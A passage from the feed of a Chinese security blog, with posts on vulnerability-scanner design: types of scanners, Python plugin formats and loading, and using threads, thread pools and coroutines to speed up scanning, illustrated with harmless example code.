&lt;ul&gt;
  &lt;li&gt;Gui扫描&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这里之所以单独区别于前面的综合扫描器【其实是笔者实在想不出小标题了XD】，是想谈谈其开发时间、开发难度，以及插件化难度。&lt;/p&gt;

&lt;p&gt;虽然说部分Gui扫描器也实现了插件化，但作者们大多喜欢自己更新，或者只要求邮件方式提交插件。&lt;/p&gt;

&lt;p&gt;这样的话，把产品生态搞成了一个近似闭环，但是肯定又远不及apple store之类的体量，导致用户主动提交的漏扫插件是比较少的。&lt;/p&gt;

&lt;p&gt;当然，有部分漏扫的功能和用户体验，还是做的很不错的，很受大家追捧，笔者当年也用的很顺手。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;椰树
北极熊扫描器
k8 team系列扫描器
千手千眼佛网站扫描器
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;代理扫描器&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说起代理扫描器，可能内容就比较宽泛了，这里简单讲下，以后有机会单独谈谈。&lt;/p&gt;

&lt;p&gt;何谓代理，中间人也，只要你能抓住中间流量，便可以作为基准去做漏洞扫描或者fuzz。&lt;/p&gt;

&lt;p&gt;大家可能会想到利用抓包，利用网卡流量进行分析；有人也许会通过浏览器流量代理进行分析；还有人会通过浏览器本身提供扩展插件功能，直接对页面进行即时钩子探测。&lt;/p&gt;

&lt;p&gt;说到这块儿，笔者所见的一般都是轻量级的，也可能是见识少吧。个人感觉很少有在采集存数据库以后，在离线端部署过多的exp探测任务的。&lt;/p&gt;

&lt;p&gt;毕竟，这块儿也是要考虑到扫描效率，以及会话过期问题的。&lt;/p&gt;

&lt;p&gt;另外，貌似代理扫描器对owasp的一些通用漏洞的fuzz，以及对敏感内容的检测，会显得多一些。对于能检测逻辑漏洞的被动扫描器，也算是比较高level的了。&lt;/p&gt;

&lt;p&gt;代表产品有：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysrc的GourdScan
burpsuite插件系列
wyproxy的衍生扫描器
浏览器插件系列
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;笔者见过的常见漏扫的架构差不多就是这些了，点到为止吧。另外，笔者自研的也有类似产品，这里就不打广告了XD。&lt;/p&gt;

&lt;p&gt;可能有部分内容，由于时间关系没能例举全，也可能有部分笔误，期待指正和建议。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">研究漏扫这块儿有段时间了，虽然是业余自己玩，但平素跟公司漏扫产品线打交道比较多，稍微有些心得，在这里简单分享下。</summary></entry><entry><title type="html">浅谈漏扫之插件篇</title><link href="/scanner/2018/10/08/scanner-plugins/" rel="alternate" type="text/html" title="浅谈漏扫之插件篇" /><published>2018-10-08T12:37:38+08:00</published><updated>2018-10-08T12:37:38+08:00</updated><id>/scanner/2018/10/08/scanner-plugins</id><content type="html" xml:base="/scanner/2018/10/08/scanner-plugins/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;在本文中，我们将简单谈谈插件相关的内容。下面的示例代码依旧沿用python，但求行文精炼不赘言。&lt;/p&gt;

&lt;h3 id=&quot;插件的格式&quot;&gt;插件的格式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def run():
    print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;运行这类插件时，加载插件的入口函数run，就可以直接运行插件。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;类 + 入口函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class BaseVerify:

    def __init__(self, url):
        self.url = url
    
    def run(self):
        print 'I am the bone of my sword'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;对于这种插件，在我们获取到漏洞库文件路径后，需要对服务类型进行匹配，最后再进行插件调用。
此后，我们会获得BaseVerify类的实例，再引用里面的入口函数。&lt;/p&gt;

&lt;p&gt;调用方式：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;test = BaseVerify('http://www.baidu.com')
test.run()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;入口函数 + 验证函数&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def assign(service, arg):
    if service != &quot;wordpress&quot;:
        return
    else:
        r = urlparse.urlparse(arg)
        return True, r.netloc
        
def audit(arg):
    print 'I am the bone of my sword'
        
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里也可以在类中引入函数，不过此处关键点在于，同时也使用了验证函数。&lt;/p&gt;

&lt;p&gt;这样做的好处在于，即使不做插件目录分类，也能进行精准扫描，不至于在验证漏洞时处耗时过多。&lt;/p&gt;

&lt;p&gt;不过顺便提一句，即使只运行了验证service类型的代码，在加载大量插件的情况下，也是会消耗一定的资源的。&lt;/p&gt;

&lt;p&gt;调用方式(仅做参考)：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;try:
    audit( assign('www', 'http://www.baidu.com')[1] )
except:
    pass
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;关于插件注释&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在每个文件中，建议通过类属性或者直接头部注释，对每个插件进行细节标识。
不然的话，他人在复现和修改的时候，很难对代码量较大的内容进行阅读调整。当然，对于某些故意加密的插件，那就另当别论了。&lt;/p&gt;

&lt;h3 id=&quot;插件的加载&quot;&gt;插件的加载&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;__import__&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;plugin_path = 'plugin_dir.plugin_name'
try:
    plugin = __import__(plugin_path, fromlist=[plugin_path])
    test = getattr(plugin,'audit')
    test('http://www.baidu.com')
except Exception,e:
    print e

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里在获取某个插件的路径后，可转换为__import__可识别的路径格式，然后再对其入口函数audit进行引用。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;importlib&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
from importlib import import_module
plugin_path = 'plugin_dir.plugin_name'
split_dot = plugin_path.rindex('.')
module, name = plugin_path[:split_dot], plugin_path[split_dot+1:]
mod = import_module(module)
try:
    test = getattr(mod, name)
    test.audit('http://www.baidu.com')
except:
    pass

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;注意，这里的plugin_path如果不含’.’的话，可用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from importlib import import_module
plugin_path = 'plugin_name'
test = import_module(plugin_path)
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;import&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
sys.path.append('plugin_dir/')
#加入系统路径plugin_dir
import plugin_name
plugin_name.audit('http://www.baidu.com')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;imp&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import imp
#这里需要正常路径名
test = imp.load_source('audit', 'plugin_dir/plugin_name.py')
test.audit('http://www.baidu.com')

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;导入细节的讨论&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;笔者还见过某框架，除了导入必要的核心库文件以外，还把所有分类插件里的验证、运行等函数，也在主文件头部一股脑导入的。&lt;/p&gt;

&lt;p&gt;也就是说，在每次运行框架之前，就算只是-v看版本，也会预载入所有内容。&lt;/p&gt;

&lt;p&gt;而在某些框架脚本，在每次运行前会自动下载一个巨大的封装库（作者diy的），而不是把它放在requirement文件里。&lt;/p&gt;

&lt;p&gt;也不是说这样一定不好，不过个人窃以为，如果想要尽可能优化框架的效率，还是不太推荐大家这么做。&lt;/p&gt;

&lt;h3 id=&quot;插件的存储&quot;&gt;插件的存储&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;临时加载&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在插件不算多的时候，我们是可以这么做的，也不会太影响效率。
比如metasploit就可以选择是否启用postgresql数据库。
如果插件都放在一个目录下，进行文件遍历即可，大概可以这样写：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vuln_dir = 'plugin_dir/*'
vuln_paths = [f.replace('/','.') for f in glob.glob(vuln_dir)]
for vuln_path in vuln_paths:
    #vuln_path == 'plugin_dir.plugin_name'
    #下面省略
    ...
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;离线插件入库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外还有不少框架，是直接用数据库或者json文件存储了插件相关信息。在我们需要的时候，再查询导入储存的插件路径，进而对相应的插件进行调用。&lt;/p&gt;

&lt;p&gt;当然，这样需要我们每次手动或调用update脚本，去现更新这些库。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在线核验下发&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果想要再自动化一点，我们可以参考下bugscan、antoor、tangscan等社区级别的漏洞利用框架，对于插件下发的法子。&lt;/p&gt;

&lt;p&gt;在贡献者上传poc，并填写好相关验证信息后，后台会有工作人员或者自动化脚本，检测该poc是否合乎官方规定的语法格式。
如果没有发现问题，脚本会生成基础信息然后入库，待做好加密打码等工作后【非必要步骤】，再供离线的框架或者框架client节点爬取更新【如有出入，当我扯淡】。&lt;/p&gt;

&lt;h3 id=&quot;结果的聚合&quot;&gt;结果的聚合&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;分级过滤&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一般在汇总数据报告时，可能会出现有的确认是漏洞，有的却是存在的敏感URL。&lt;/p&gt;

&lt;p&gt;混在一起存储也不是不行，不过更好的法子是通过分级，使用单独的函数上报master，最后再进行分储和输出。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;混合存储&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在整合网上搜集来的插件时，由于各结果的返回格式不是很好统一，有的整合型框架为了兼容会直接简单处理下，就糅合在一起存储和输出了。
其实这也没啥，只要入库的时候，将特殊字符等问题处理好，做好插件漏洞的信息粗放分类标注，那就基本OK了。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;单体输出&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;某些作者单独开发的框架，是直接省略了存储这一环节的，或者是提供了选项，默认不开启的。
这时候，插件验证如果成功，会直接把信息反馈输出到命令行里。如果在验证单体漏洞或者单个目标的时候，这样做还是比较有效率的。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</summary></entry><entry><title type="html">浅谈漏扫之加速篇</title><link href="/scanner/2018/09/03/scanner-faster/" rel="alternate" type="text/html" title="浅谈漏扫之加速篇" /><published>2018-09-03T12:48:18+08:00</published><updated>2018-09-03T12:48:18+08:00</updated><id>/scanner/2018/09/03/scanner-faster</id><content type="html" xml:base="/scanner/2018/09/03/scanner-faster/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;为了方便描述，笔者这里会拿python的库来举例，部分代码采集自网络。本文会向大家简要评析一些能加快扫描速率的库。希望借此帮大家规避掉一些坑，很多点也是具有普适性的。&lt;/p&gt;

&lt;h3 id=&quot;线程&quot;&gt;线程&lt;/h3&gt;

&lt;h4 id=&quot;多线程&quot;&gt;多线程&lt;/h4&gt;

&lt;p&gt;示例：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;threading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用法比较简单，普通速成小脚本建议用这个库，比如在扫描主机存活或者探测URL路径是否存在的时候。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding:utf-8
import threading
import time

def action(arg):
    time.sleep(1)
    print  'sub thread start!the thread name is:%s    ' % threading.currentThread().getName()
    print 'the arg is:%s   ' %arg
    time.sleep(1)


for i in xrange(4):
    t =threading.Thread(target=action,args=(i,))
    t.setDaemon(True)
    t.start()
    t.join()

print 'main_thread end!'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;thread&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有的朋友可能会问，有没有更简单的，老夫不懂那么多，只想一把梭！
当然有，很早以前笔者也曾喜欢使用这个库：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=gbk
import thread, time, random
count = 0
def threadTest():
    global count
    for i in xrange(10000):
        count += 1
for i in range(10):
    thread.start_new_thread(threadTest, ())	
time.sleep(3)
print count	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;不过thread.start_new_thread有个比较明显的缺点，因为起了新线程是不好控制的，一旦任务挂起过多，会占用较多的机器资源，所以建议在检测目标量不大的时候使用。&lt;/p&gt;

&lt;h4 id=&quot;线程池&quot;&gt;线程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;threadpool&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说实在这库还是比较好用的，在无序输出结果等情况下比较稳健，尤其是它在win平台下兼容性是比较好的。
不过需要注意，就是如果不加锁的话，需要先做数据聚合。直接按序写入文件，或者直接入库的话，数据会乱掉。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
import threadpool  
def sayhello(str):
    print &quot;Hello &quot;,str
    time.sleep(2)

name_list =['xiaozi','aa','bb','cc']
start_time = time.time()
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(sayhello, name_list) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
print '%d second'% (time.time()-start_time)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;concurrent.futures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;该库是python 3.x自带的，但python 2.x也能用，相对来说会比threadpool更优化的多一些，毕竟新库嘛。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;concurrent.futures&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time1: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#submit提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time2: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#map提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time3: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们可以看看上面的代码注释，其中submit和map的区别在于：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;map可以保证输出的顺序, submit输出的顺序是乱的。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;如果你要提交的任务的函数是一样的，就可以简化成map。但是假如提交的任务函数是不一样的，或者执行的过程之可能出现异常（使用map执行过程中发现问题会直接抛出错误）就要用到submit。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;submit和map的参数是不同的，submit每次都需要提交一个目标函数和对应的参数，map只需要提交一次目标函数，目标函数的参数放在一个迭代器（列表，字典）里就可以。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;协程&quot;&gt;协程&lt;/h3&gt;

&lt;p&gt;协程算是一种用户级别的轻量级线程，调度较线程会麻烦一些，但因为开销减少提升了性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;gevent&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个就是熟面孔了，许多经典爬虫都会用到这个库，在linux下贼好用的。不过因为依赖库的问题，让它在win下总是出现greenlet等库的版本和依赖问题。&lt;/p&gt;

&lt;p&gt;不过比之线程池的threadpool，这个不加锁时也不用担心乱序问题。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import requestss

def detect(url):
    try:
        r = requests.get(url,  headers= headers ,timeout = timeout ,verify = False)
    except Exception,e:
        return

pool = Pool(20)#协程数
pool.map(detect, urls)
[pool.putRequest(req) for req in reqs]
pool.wait()

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;其他协程库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外，其他实现协程的库还是蛮多的，这里不方便列举，有兴趣的朋友可以搜搜。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;asyncio&lt;/li&gt;
  &lt;li&gt;tornado&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;进程&quot;&gt;进程&lt;/h3&gt;

&lt;p&gt;进程间的切换，会消耗较多的资源和时间，一般会配合多线程/协程使用，叠加对任务进行分发。&lt;/p&gt;

&lt;p&gt;下面我们来看几个案例：&lt;/p&gt;

&lt;h4 id=&quot;多进程&quot;&gt;多进程&lt;/h4&gt;

